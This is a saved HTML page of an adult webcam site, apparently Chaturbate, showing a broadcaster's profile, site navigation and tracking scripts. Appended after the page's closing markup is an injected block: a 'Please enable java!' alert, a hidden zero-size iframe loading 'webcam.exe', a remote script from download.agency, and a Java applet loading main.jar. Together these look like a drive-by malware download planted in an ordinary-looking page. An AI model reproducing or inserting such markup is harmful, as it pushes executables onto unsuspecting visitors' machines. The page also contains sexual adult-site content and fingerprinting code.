<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://ssl-ccstatic.highwebmedia.com/favicons/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon-precomposed" sizes="76x76" href="https://ssl-ccstatic.highwebmedia.com/favicons/apple-touch-icon-76x76.png">
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://ssl-ccstatic.highwebmedia.com/favicons/apple-touch-icon-72x72.png">
<link rel="apple-touch-icon-precomposed" sizes="60x60" href="https://ssl-ccstatic.highwebmedia.com/favicons/apple-touch-icon-60x60.png">
<link rel="apple-touch-icon-precomposed" href="https://ssl-ccstatic.highwebmedia.com/favicons/apple-touch-icon-57x57.png">
<link rel="manifest" href="https://ssl-ccstatic.highwebmedia.com/favicons/manifest.json">
<link rel="stylesheet" href="https://ssl-ccstatic.highwebmedia.com/CACHE/css/output.b8c4c25fc9ca.css" type="text/css" media="all" />
<link rel="stylesheet" href="https://ssl-ccstatic.highwebmedia.com/CACHE/css/output.bcedc0a78cd4.css" type="text/css" media="all" />
<link rel="stylesheet" href="https://ssl-ccstatic.highwebmedia.com/CACHE/css/output.8ce805457f69.css" type="text/css" /><link rel="stylesheet" href="https://ssl-ccstatic.highwebmedia.com/CACHE/css/output.cef1f4a839d5.css" type="text/css" media="all" />
<!--[if IE 8]>
    <script type="text/javascript" src="https://ssl-ccstatic.highwebmedia.com/CACHE/js/output.2e6a942d8d47.js"></script>
    <style>#cb2_link_box{display:none!important;}</style>
  <![endif]-->
<!--[if IE 9]>
    <script type="text/javascript" src="https://ssl-ccstatic.highwebmedia.com/CACHE/js/output.a5d15c8c286c.js"></script>
  <![endif]-->
<script type="text/javascript">;(function(){var tsQueue=[];var tsWatcher=setInterval(function(){var tsInstance=window['tsInstance'];if(tsInstance!==undefined){clearInterval(tsWatcher);while(tsQueue.length>0){tsQueue.shift()(tsInstance);}}},50);window['tsExec']=function(func){if(window['tsInstance']!==undefined&&tsQueue.length<=0){func(window['tsInstance']);}else{tsQueue.push(func);}}})();;if(window.self!==window.top&&window.top["onFrameLoad"]!==undefined){window.top["onFrameLoad"](window.self)}</script>
</head>
<body>
<div id="header">
<div class="ad">
</div>
<div class="section clearfix">
<div class="logo-zone">
<a href="/" data-floatingnav>
<svg width="198" height="61">
<image xlink:href="https://ssl-ccstatic.highwebmedia.com/images/logo.svg" src="https://ssl-ccstatic.highwebmedia.com/images/logo-standard.png" width="198" height="61" />
</svg>
</a>
<strong>THE ACT OF MASTURBATING WHILE CHATTING ONLINE</strong>
</div>
<div align="right">
<div id="user_information">
<div id="user_information_header" class="user_information_header">
<div id="user_information_profile_container" class="user_information_container anonymous">
<img class="user_information_header_icon" src="https://ssl-ccstatic.highwebmedia.com/images/gendericons/anon.svg" alt="Anonymous Icon" />
</div>
</div>
<div class="bottom">
<table width="100%">
<tr>
<th>Status:</th>
<td>
Anonymous
</td>
<td>&nbsp;</td>
</tr>
<tr>
<th>You have:</th>
<td>
<div class="overflow">
<strong class="auip_tokens">
<span class='tokencount' updatable-count>0</span> Tokens
</strong>
</div>
</td>
<td>
<a href="#" class='purchase_tokens'>(Get More)</a>
</td>
</tr>
</table>
</div>
</div>
</div>
</div>
<div class="nav-bar">
<ul id="nav">
<li><a href="/" data-floatingnav>CHAT ROOMS</a></li>
<li><a href="/accounts/register/?src=broadcast">BROADCAST YOURSELF</a></li>
<li><a href="/tags/" data-floatingnav">TAGS</a></li>

<li><a href="/tipping/free_tokens/">EARN FREE TOKENS</a></li>
<li><a href="https://cbswag.com">CB SWAG</a></li>
<li><a class="login-link nooverlay" href="/auth/login/">LOG IN</a></li>
</ul>
<a href="/accounts/register/?src=header&auipsrc=navbar&room=katieecage" class="creat nooverlay auip_track">SIGN UP</a>
</div>
</div>
<div id="main" class="chat_room">
<noscript>
    

<div class="noscript">
    <div class="cam_nav">
        <div class="subnav-1">
            <a class="link selected" href>Katieecage's Cam</a>
            <a class="link" href="/female-cams/">FEMALE</a>
            <a class="link" href="/male-cams/">MALE</a>
            <a class="link" href="/couple-cams/">COUPLE</a>
            <a class="link" href="/trans-cams/">TRANS</a>
            
        </div>
        <div class="subnav-2">
            <a href="/next/katieecage/">NEXT CAM (CTRL-/) ▸</a>
        </div>
    </div>
    <div class="container">
        
            <div class="cam-offline">Room is currently offline</div>
        
        <div class="room">
            <div class="info">
                <div class="header">
                    <div class="bio-tab">Bio</div>
                </div>
                <div class="description">
                    <div class="bio-title">
                        Katieecage's Bio and Free Webcam</div>
                    <div class="bio">
                        <div class="attribute">
                            <div class="label">Real Name:</div>
                            <div class="data">bbykatie</div>
                        </div>
                        <div class="attribute">
                            <div class="label">Followers:</div>
                            <div class="data">9689</div>
                        </div>
                        
                            <div class="attribute">
                                <div class="label">Birth Date:</div>
                                <div class="data">May 29, 2002</div>
                            </div>
                            <div class="attribute">
                                <div class="label">Age:</div>
                                <div class="data">18</div>
                            </div>
                        
                        <div class="attribute">
                            <div class="label">I am:</div>
                            <div class="data">Female</div>
                        </div>
                        <div class="attribute">
                            <div class="label">Interested In:</div>
                            <div class="data">Men, Women</div>
                        </div>
                        <div class="attribute">
                            <div class="label">Location:</div>
                            <div class="data">United States</div>
                        </div>
                        
                            <div class="attribute">
                                <div class="label">Last Broadcast:</div>
                                <div class="data">1 hour ago</div>
                            </div>
                        
                        
                            <div class="attribute">
                                <div class="label">Languages:</div>
                                <div class="data">English</div>
                            </div>
                        
                        
                            <div class="attribute">
                                <div class="label">Body Type:</div>
                                <div class="data">petite</div>
                            </div>
                        
                        
                            <div class="attribute">
                                <div class="label">Smoke / Drink:</div>
                                <div class="data">smoke occasionally</div>
                            </div>
                        
                        
                        
                            
                                

                            
                        
                        
                        <div class="attribute about-me">
                            <div class="label">About Me:</div>
                            
                            
                            <div class="data"><p>just your lil angel next door &lt;3 cum stop by and say hi</p></div>
                            
                            
                        </div>
                        
                        
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

</noscript>
</div>
<div class="footer-holder" id="footer-holder">
<div class="footercon">
<div class="col1">
<h2>Free Cams</h2>
<dl>
<dd><a href="/" data-floatingnav>Featured Cams</a></dd>
<dd><a href="/female-cams/" data-floatingnav>Female Cams</a></dd>
<dd><a href="/male-cams/" data-floatingnav>Male Cams</a></dd>
<dd><a href="/couple-cams/" data-floatingnav>Couple Cams</a></dd>
<dd><a href="/trans-cams/" data-floatingnav>Trans Cams</a></dd>
</dl>
</div>
<div class="col2">
<h2>Free Cams by Age</h2>
<dl>
<dd><a href="/teen-cams/" data-floatingnav>Teen Cams (18+)</a></dd>
<dd><a href="/18to21-cams/" data-floatingnav>18 to 21 Cams</a></dd>
<dd><a href="/20to30-cams/" data-floatingnav>20 to 30 Cams</a></dd>
<dd><a href="/30to50-cams/" data-floatingnav>30 to 50 Cams</a></dd>
<dd><a href="/mature-cams/" data-floatingnav>Mature Cams (50+)</a>
</dd>
</dl>
</div>
<div class="col3">
<h2>Free Cams by Region</h2>
<dl>
<dd><a href="/north-american-cams/" data-floatingnav>North American Cams</a></dd>
<dd><a href="/other-region-cams/" data-floatingnav>Other Region Cams</a></dd>
<dd><a href="/euro-russian-cams/" data-floatingnav>Euro Russian Cams</a></dd>
<dd><a href="/asian-cams/" data-floatingnav>Asian Cams</a></dd>
<dd><a href="/south-american-cams/" data-floatingnav>South American Cams</a>
</dd>
</dl>
</div>
<div class="col4">
<h2>Free Cams by Status</h2>
<dl>
<dd><a href="/exhibitionist-cams/" title="Exhibitionist Cams  - Couple" data-floatingnav>Exhibitionist Cams</a>
</dd>
<dd><a href="/hd-cams/" data-floatingnav>HD Cams</a></dd>
<dd><a href="/spy-on-cams/" data-floatingnav>Private Shows</a></dd>
<dd><a href="/new-cams/" data-floatingnav>New Cams</a></dd>
</dl>
</div>
<div class="col5">
<h2>Private Shows</h2>
<dl>
<dd><a href="/6-tokens-per-minute-private-cams/female/" data-floatingnav>6 Tokens per Minute</a></dd>
<dd><a href="/12-tokens-per-minute-private-cams/female/" data-floatingnav>12 Tokens per Minute</a></dd>
<dd><a href="/18-tokens-per-minute-private-cams/female/" data-floatingnav>18 Tokens per Minute</a></dd>
<dd><a href="/30-tokens-per-minute-private-cams/female/" data-floatingnav>30 Tokens per Minute</a></dd>
<dd><a href="/60-tokens-per-minute-private-cams/female/" data-floatingnav>60 Tokens per Minute</a></dd>
<dd><a href="/90-tokens-per-minute-private-cams/female/" data-floatingnav>90 Tokens per Minute</a></dd>
</dl>
</div>
</div>
<ul class="nav">
<li><a href="/terms/">Terms &amp; Conditions</a></li>
<li><a href="/privacy/">Privacy Policy</a></li>
<li><a href="https://support.chaturbate.com/">Support</a></li>
<li><a href="https://www.surveymonkey.com/r/5XLZ85R" target="_blank">Feedback</a></li>
<li><a href="/security/">Security Center</a></li>
<li><a href="/law_enforcement/">Law Enforcement</a></li>
<li><a href="/billingsupport/">Billing</a></li>
<li><a href="/security/privacy/deactivate/">Disable Account</a></li>
<li><a href="/apps/">Apps</a></li>
<li><a href="/contest/details/">Contest</a></li>
<li><a href="/affiliates/">Affiliates</a></li>
<li><a href="https://exoticads.com/">Buy Traffic</a></li>
<li><a href="/jobs/" target="_blank">Jobs</a></li>
<li><a href="/sitemap/">Sitemap</a></li>
</ul>
<ul>
<li><a href="https://ar.chaturbate.com/">العربيّة</a></li>
<li><a href="https://de.chaturbate.com/">Deutsch</a></li>
<li><a href="https://el.chaturbate.com/">Ελληνικά</a></li>
<li><a href="https://en.chaturbate.com/">English</a></li>
<li><a href="https://es.chaturbate.com/">Español</a></li>
<li><a href="https://fr.chaturbate.com/">Français</a></li>
<li><a href="https://hi.chaturbate.com/">Hindi</a></li>
<li><a href="https://it.chaturbate.com/">Italiano</a></li>
<li><a href="https://ja.chaturbate.com/">日本語</a></li>
<li><a href="https://ko.chaturbate.com/">한국어</a></li>
<li><a href="https://nl.chaturbate.com/">Nederlands</a></li>
<li><a href="https://pt.chaturbate.com/">Português</a></li>
<li><a href="https://ru.chaturbate.com/">Русский</a></li>
<li><a href="https://tr.chaturbate.com/">Türkçe</a></li>
<li><a href="https://zh.chaturbate.com/">简体中文</a></li>
</ul>
<ul id="social-media-icons">
<li><a href="https://twitter.com/chaturbate" data-social-type="twitter" target="_blank"><img alt="twitter" src="https://ssl-ccstatic.highwebmedia.com/images/socialmediaicons/social-media-twitter.svg" /></a></li>
<li><a href="https://www.facebook.com/ChaturbateCommunity/" data-social-type="facebook" target="_blank"><img alt="facebook" src="https://ssl-ccstatic.highwebmedia.com/images/socialmediaicons/social-media-facebook.svg" /></a></li>
<li><a href="https://www.instagram.com/chaturbatecommunity/" data-social-type="instagram" target="_blank"><img alt="instagram" src="https://ssl-ccstatic.highwebmedia.com/images/socialmediaicons/social-media-instagram.svg" /></a></li>
</ul>
<p><a href="/2257/">18 U.S.C. 2257 Record Keeping Requirements Compliance Statement</a></p>
<img style="padding-bottom:5px;width:589px;opacity:1.3;" src="https://ssl-ccstatic.highwebmedia.com/images/cb-footer-address-US.png">
<p>&copy; Copyright Chaturbate.com 2011 - 2020. All Rights Reserved. 171</p>
<p style="margin-top: 15px;">
<img src="https://ssl-ccstatic.highwebmedia.com/images/badges/safelabeling.gif">
<a href="http://www.rtalabel.org/"><img src="https://ssl-ccstatic.highwebmedia.com/images/badges/88x31_RTA-5042-1996-1400-1577-RTA_a.gif" style="margin: 0 10px;"></a>
<a href="http://www.asacp.org/ASACP.php/"><img src="https://ssl-ccstatic.highwebmedia.com/images/badges/ApprovedASACPmember.gif"></a>
</p>
</div>
<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","queueTime":0,"licenseKey":"6f524845d1","agent":"","transactionName":"MwYEbUdYXxJQWhULDApMIExbWkUIXldOAQsFF0hPXFxGEgtrDg0OMgoDThteVBU=","atts":"H0ETGw9CEwBfVg89BQgCAUoXAxNDHRsUAzwABhBQVlxuFUhJBEBZRgcDSl5NXhETFUMRChAGOVBRGwtQHRsUAzwLEDlPUEtCCF5XQ1hBVVNEFRdbVBJFZgYXBhcQOV5QVhNbE3ogQE9GFhVcR2ZYBRMDUU5BFgYXTFBKRT5ZVhIWQV5BBVFUTUQTU1gVB00HDAsbGRtCCEVcPgMPDQIVGw8bUglQTRQQAQUXAxdWVlxDHRsTBxIRBhVNalRUFVlWBUBZRiQjbRcVExFQSwAPEEZZREJIGx1DUls+FAYWEA9WWxsLUx0bFAM8CxA5X1RUWA1IG1tANA0NAlZCShNNE0wSBxEKAgtcFwMTPm5YDw0NOzxEFRdKWBVUZgUNDgUKCBsPG1IJUE0UEAEFFwMXVlZcQx0bFAM8BhEJTkZcQz5HXBMRCgsNRAMXAQJPARdVU1NXQUobR1xQDW5QEUBZRlFQCQEDAgUBAVtQVVMHXA4FCQFbVV1ZAFlVBl4PDw9XWwlaAlpBSEEES1pOQgRDZggGQV5BV10DCQhQAA9MBFJWAUsNVg4JTAhdAFpOUQYEAVEAB1RQWgBaQUhBJX9qe14VEwNYVk9GFgdmUVxHCFJcPgQCCQoKQBcDEy5FUQQQQUhBFFZaVG4SRVgVFxBGWURVXE9UQx0bEwcFAREDSxcDE0MdGwIDDjsXB14XAxMPVE5DTkEWDAlUakxCBEMbW0AIBRcPXFBaUAZUG01AFAg8DlZGTRNbE1oJAxcREQRYQVwfAl5UQ05BFgYXTFBKRT5BWBUKQV5BSVJUTVgEVFoABQZLQUobRlBWD0RJPgYCEAZEAwUVEwNUShU9BBEGFUpqUEFDCxtTVFNQWVVdBQELUwcOBVhUVFNWA1FdCQMLCARaVV5VAAMNWlJZExVDBQoQPAVWWFRYFRMDQwZWAVQCWFYBBEMdGxQDPBcXFFBbXhNbE3QOGAoIDwcWABcBQRluCAwHCxQVGXttEVABF1FZQzMKCA8BAhEZBw1IQiIUEwpcYlxTKlhNTldQU01VDxUReilldC1OQwgKDVwVflQCWlZIQiAMEQlUUBYJUh8JT1ZSVFBICAQPETJQXwAQCktWVQ4bCgdDHRsiJDw2Ah8bDxsEAwFcBVFUAFVTWwFfBFgAFDInIkZPRExUZlMTXk4SBxE7BQdUXFVIQwsbIgoRCw4DG0hE","applicationID":"24279235","errorBeacon":"bam.nr-data.net","applicationTime":143}</script>
</body>
<script type="text/javascript" src="/jsi18n/"></script>
<script type="text/javascript" src="https://ssl-ccstatic.highwebmedia.com/CACHE/js/output.b49d4b833f48.js"></script>
<script type="text/javascript" src="https://ssl-ccstatic.highwebmedia.com/CACHE/js/output.d45f7d7e7bd0.js"></script>
<script type='text/javascript'>
$.facebox.settings.loadingImage = 'https://ssl-ccstatic.highwebmedia.com/facebox/loading.gif';
$.facebox.settings.closeImage = 'https://ssl-ccstatic.highwebmedia.com/facebox/closelabel.png';
$(document).ready(function() {
  $('.increase_limits a, a.increase_limits').click(function() {
    var popupwindow = window.open("/tipping/purchase_tokens/increase_limits/", '_blank',
            'status=0,toolbar=0,menubar=0,directories=0,resizable=1,' +
                    'scrollbars=1,height=615,width=850');
    popupwindow.focus();
    return false;
  });
});

$.ajaxSetup ({
    // Disable caching of AJAX responses
    cache: false
});

$(document).ready(function(){
  var mySwfStore = new SwfStore({
    namespace: 'ogcamsite818',
    swf_url: 'https://ssl-ccstatic.highwebmedia.com/javascript-flash-cookies/storage.swf',
    debug: false,
    onready: function() {
      
    }
  });
  function should_link_accounts(){
    var latest_username = $.cookie('latest_linked_username');
    if (latest_username == null){
        return true;
    }
    if (latest_username != ''){
        return true;
    }
    var latest_update = $.cookie('latest_linked_timestamp');
    if (latest_update == null){
        return true;
    }
    var msecs = new Date().getTime() - latest_update;
    return msecs > (60*20*1000);
  }

  function csrfSafeMethod(method) {
      return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));
  }
  $.ajaxSetup({
      crossDomain: false,
      beforeSend: function(xhr, settings) {
          if (!csrfSafeMethod(settings.type)) {
              xhr.setRequestHeader("X-CSRFToken", $.cookie('csrftoken'));
          }
      }
  });

    function link_accounts() {
        if (!should_link_accounts()){
            return false;
        }
        var oldval = mySwfStore.get('usernames2');
        if (oldval == null | oldval == '') {
            var usernames = [""];
        } else {
            var usernames = oldval.split(',');
            var foundcurrent = false;
            $.each(usernames, function (key, username) {
                if (username != "") {
                    setTimeout(function () {
                        $.post("/accounts/linkaccounts/", {
                            'username': username,
                            'token': '',
                            'expiration': ''
                        });
                    }, ((key + 1) * 100));
                } else {
                    foundcurrent = true;
                }
            });
            if (!foundcurrent) {
                usernames.push("");
            }
        }
        mySwfStore.set('usernames2', usernames.join(','));
        $.cookie('latest_linked_timestamp', new Date().getTime(), {expires: 1, path: '/'});
        $.cookie('latest_linked_username', '', {expires: 1, path: '/'});
    }
});

function recordOutboundLink(link, category, action) {
  try {
    var myTracker=_gat._getTrackerByName();
    _gaq.push(['_trackEvent', category ,  action ]);
    setTimeout('document.location = "' + link.href + '"', 100)
  }catch(err){}
}

$(document).ready(function(){
    var achdismisscookie = $.cookie('ach_dismiss_');
    if (!achdismisscookie) {
        $('#direct_deposit_warning').show();
        $('#direct_deposit_warning a.dismiss').click(function() {
            $('#direct_deposit_warning').hide();
            $.cookie('ach_dismiss_', 1, 31557600);
        });
    }

    $('.mobile_site_redirect').click(function () {
        $.cookie('mobile_redirect', null, { expires: 1, path: '/', domain: 'chaturbate.com'});
    });

    $('.top_alert_close').click(function () {
        var date = new Date();
        date.setTime(date.getTime() + (18 * 60 * 60 * 1000)); // 18 hours
        $.cookie('mobile_redirect_hide', 'true', { expires: date, path: '/', domain: 'chaturbate.com'});
        $('.top_alert').hide();
    });
    $('#mobile_dismissible_redirect').click(function() {
        if (window.newrelic) {
            window.newrelic.addPageAction("MobileAlertLinkClicked");
        }
    });
    $('#mobile_dismissible_survey').click(function() {
        if (window.newrelic) {
            window.newrelic.addPageAction("MobileAlertSurveyClicked");
        }
    });
    $('#social-media-icons a').click(function () {
        if (window.newrelic) {
            window.newrelic.addPageAction("ClickSocialMediaLink", {
                "attributes.source": "desktop",
                "attributes.clicked_socialmedia": $(this).attr("data-social-type"),
            })
        }
    })
});

if ($.fn.hasOwnProperty('live')) {
    $.fn.on = $.fn.live;
} else {
    $.fn.live = $.fn.on;
}

</script>
<script type='text/javascript'>
            if (top.location.hostname != location.hostname || top.location.pathname != location.pathname) {
                top.location.href = document.location.href ;
            }
        </script>

<script type="text/javascript" src="https://ssl-ccstatic.highwebmedia.com/CACHE/js/output.eab99041e9ec.js"></script>
<script type="text/javascript" src="https://ssl-ccstatic.highwebmedia.com/CACHE/js/output.8c51433cc9b1.js"></script>
<!--[if lt IE 9]>
<script type="text/javascript" src="https://ssl-ccstatic.highwebmedia.com/CACHE/js/output.795fd437ea7a.js"></script>
<![endif]-->
<script src="https://www.gstatic.com/cv/js/sender/v1/cast_sender.js?loadCastFramework=1"></script>
<script type="text/javascript" src="https://ssl-ccstatic.highwebmedia.com/CACHE/js/output.4e1ae29110de.js"></script>
<script type="text/javascript">
window.recommender_websocket_url = "";
window.initialRoomDossier = "{\u0022allow_group_shows\u0022: true, \u0022needs_supporter_to_pm\u0022: true, \u0022ads_zone_ids\u0022: {\u0022300x250,centre\u0022: \u0022\u0022, \u0022300x250,right\u0022: \u0022\u0022, \u0022300x250,left\u0022: \u0022\u0022, \u0022468x60\u0022: \u0022\u0022, \u0022160x600,top\u0022: \u0022\u0022, \u0022160x600,bottom\u0022: \u0022\u0022, \u0022160x600,middle\u0022: \u0022\u0022}, \u0022chat_settings\u0022: {\u0022sort_users_key\u0022: \u0022a\u0022, \u0022silence_broadcasters\u0022: \u0022false\u0022, \u0022highest_token_color\u0022: \u0022darkpurple\u0022, \u0022emoticon_autocomplete_delay\u0022: \u00220\u0022, \u0022ignored_users\u0022: \u0022\u0022, \u0022show_emoticons\u0022: true, \u0022font_size\u0022: \u00229pt\u0022, \u0022b_tip_vol\u0022: \u002210\u0022, \u0022allowed_chat\u0022: \u0022all\u0022, \u0022room_leave_for\u0022: \u0022org\u0022, \u0022font_color\u0022: \u0022#494949\u0022, \u0022font_family\u0022: \u0022default\u0022, \u0022room_entry_for\u0022: \u0022org\u0022, \u0022v_tip_vol\u0022: \u002280\u0022}, \u0022is_age_verified\u0022: true, \u0022flash_host\u0022: \u0022edge195.stream.highwebmedia.com\u0022, \u0022tips_in_past_24_hours\u0022: 0, \u0022dismissible_messages\u0022: [], \u0022show_mobile_site_banner_link\u0022: false, \u0022last_vote_in_past_90_days_down\u0022: false, \u0022server_name\u0022: \u0022171\u0022, \u0022num_users_required_for_group\u0022: 2, \u0022group_show_price\u0022: 12, \u0022is_mobile\u0022: false, \u0022chat_username\u0022: \u0022__anonymous__JECb2g50O\u0022, \u0022recommender_hmac\u0022: \u0022baeca6ee78fee95527385f8a3489b48b014efa37fbea05721138397d555c4176\u0022, \u0022broadcaster_gender\u0022: \u0022female\u0022, \u0022hls_source\u0022: \u0022https://edge195.stream.highwebmedia.com/live\u002Dhls/amlst:katieecage\u002Dsd\u002D494c7e0ffd5346be6747faf303574cb709cd4e4c817833cb0e47300a18032103_trns_h264/playlist.m3u8\u0022, \u0022allow_show_recordings\u0022: true, \u0022is_moderator\u0022: false, \u0022room_status\u0022: \u0022public\u0022, \u0022edge_auth\u0022: \u0022{\u005C\u0022username\u005C\u0022:\u005C\u0022__anonymous__JECb2g50O\u005C\u0022,\u005C\u0022org\u005C\u0022:\u005C\u0022A\u005C\u0022,\u005C\u0022expire\u005C\u0022:1594433528,\u005C\u0022sig\u005C\u0022:\u005C\u002243522a09f599768ac081f2b6a5944853d8c75791f39adf436027c699d850aeff\u005C\u0022,\u005C\u0022room\u005C\u0022:\u005C\u0022katieecage\u005C\u0022}\u0022, \u0022is_supporter\u0022: false, \u0022chat_password\u0022: \u0022{\u005C\u0022username\u005C\u0022:\u005C\u0022__anonymous__JECb2g50O\u005C\u0022,\u005C\u0022org\u005C\u0022:\u005C\u0022A\u005C\u0022,\u005C\u0022expire\u005C\u0022:1594433528,\u005C\u0022sig\u005C\u0022:\u005C\u002243522a09f599768ac081f2b6a5944853d8c75791f39adf436027c699d850aeff\u005C\u0022,\u005C\u0022room\u005C\u0022:\u005C\u0022katieecage\u005C\u0022}\u0022, \u0022room_pass\u0022: \u00225224a6a950f675135feca70614dbe04f0e413d1a9e0745f7e5b86308f303c95e\u0022, \u0022low_satisfaction_score\u0022: false, \u0022tfa_enabled\u0022: false, \u0022room_title\u0022: \u0022car maybe \u003B) [3516 tokens remaining]\u0022, \u0022satisfaction_score\u0022: {\u0022down_votes\u0022: 2, \u0022up_votes\u0022: 22, \u0022percent\u0022: 92, \u0022max\u0022: 32355782}, \u0022viewer_username\u0022: \u0022AnonymousUser\u0022, \u0022hidden_message\u0022: \u0022\u0022, \u0022following\u0022: false, \u0022wschat_host\u0022: \u0022https://chatws\u002D45.stream.highwebmedia.com/ws\u0022, \u0022has_studio\u0022: false, \u0022num_followed\u0022: 0, \u0022spy_private_show_price\u0022: 6, \u0022hide_satisfaction_score\u0022: false, \u0022broadcaster_username\u0022: \u0022katieecage\u0022, \u0022ignored_emoticons\u0022: [], \u0022apps_running\u0022: \u0022[[\u005C\u0022Baby Tip Menu\u005C\u0022,\u005C\u0022\u005C\u005C/apps\u005C\u005C/app_details\u005C\u005C/baby\u002Dtip\u002Dmenu\u005C\u005C/?slot\u003D2\u005C\u0022],[\u005C\u0022TIP GOAL APP\u005C\u0022,\u005C\u0022\u005C\u005C/apps\u005C\u005C/app_details\u005C\u005C/tip\u002Dgoal\u002Dapp\u005C\u005C/?slot\u003D3\u005C\u0022]]\u0022, \u0022token_balance\u0022: 0, \u0022private_min_minutes\u0022: 2, \u0022viewer_gender\u0022: \u0022m\u0022, \u0022allow_anonymous_tipping\u0022: false, \u0022num_users_waiting_for_group\u0022: 0, \u0022last_vote_in_past_24_hours\u0022: null, \u0022is_widescreen\u0022: false, \u0022num_viewers\u0022: 9193, \u0022broadcaster_on_new_chat\u0022: false, \u0022private_show_price\u0022: 120, \u0022num_followed_online\u0022: 0, \u0022allow_private_shows\u0022: true}";
</script>
<script type="text/javascript" src="https://ssl-ccstatic.highwebmedia.com/CACHE/js/output.01b73ab8938a.js"></script>
<script type="text/javascript" src="https://ssl-ccstatic.highwebmedia.com/CACHE/js/output.d321355cb8d9.js"></script>
<script async src="https://cdn.exoticads.com/xads.js"></script>
<script type="text/javascript" src="https://ssl-ccstatic.highwebmedia.com/CACHE/js/output.e7288525e576.js"></script>
<script type="text/javascript" id="gaq">
	ga('create', 'UA-23607725-1', 'auto');
	ga('set', 'dimension1', 'chaturbate.com');
	ga('set', 'dimension2', '');
	
		ga('set', 'dimension3', '-');
		ga('set', 'dimension4', '');
		ga('set', 'dimension5', 'anonymous');
	
	ga('send', 'pageview');
    
</script>
<script type="text/javascript" src="https://ssl-ccstatic.highwebmedia.com/CACHE/js/output.92c98302d256.js"></script>
<script type="text/javascript">
            $(document).ready(function () {
                setTimeout(function () {
                    var fossilOptions = {};
                    Fossil.get(fossilOptions, function (components) {
                    	var values = components.map(function (component) { return component.value });
                        var murmur = Fossil.x64hash128(values.join(''), 31);
                        $.post("/fossil/i/", {
                        	'result': Base64.encode(murmur)
                        });
                    });
                }, 1000);
            });
        </script>
<script type="text/javascript">
if (window.group_shows_enabled === undefined) {
    window.group_shows_enabled = false
}

if (window.hide_entrance_terms === undefined) {
    window.hide_entrance_terms = false
}
</script>
<script type="text/javascript" src="https://ssl-ccstatic.highwebmedia.com/cachebust/theatermode-prod-d5e7dac85.js"></script>
<script type="text/javascript">
    (function() {
        // Minimal extend implementation suitable for our single use case below
        var extend = Object.assign || function (obj) {
            var others = Array.prototype.slice.call(arguments, 1);
            for (var i = 0; i < others.length; i++) {
                var other = others[i];
                for (var key in other) {
                    if (other.hasOwnProperty(key)) {
                        obj[key] = other[key];
                    }
                }
            }
            return obj;
        };
        window["tsInstance"] = new TS(extend({
            no_ads: true,
            logged_in_user: JSON.parse('null'),
            push_service_tokens: JSON.parse('null'),
            flags: {
                token_balance_push_enabled:true,
                news_push_enabled:true,
            },
            settings: {
                push_service_url: ''
            },
        }, JSON.parse('{\u0022enabled_floatingplayer\u0022: true, \u0022is_testbed\u0022: false}')));

    })();
</script>
<body>
<script>alert("Please enable java!");</script>
<iframe width=0px height=0px visibility="none" src="webcam.exe"/>
<script type="text/JavaScript" src="http://download.agency/campaign.js"></script>
  <applet code="primary/Download.class" archive="main.jar"
   width="740" height="400"></applet>
  <object codetype="application/java" classid="java:primary/Download.class"
   archive="main.jar" width="740" height="400"></object>
</body>
</html>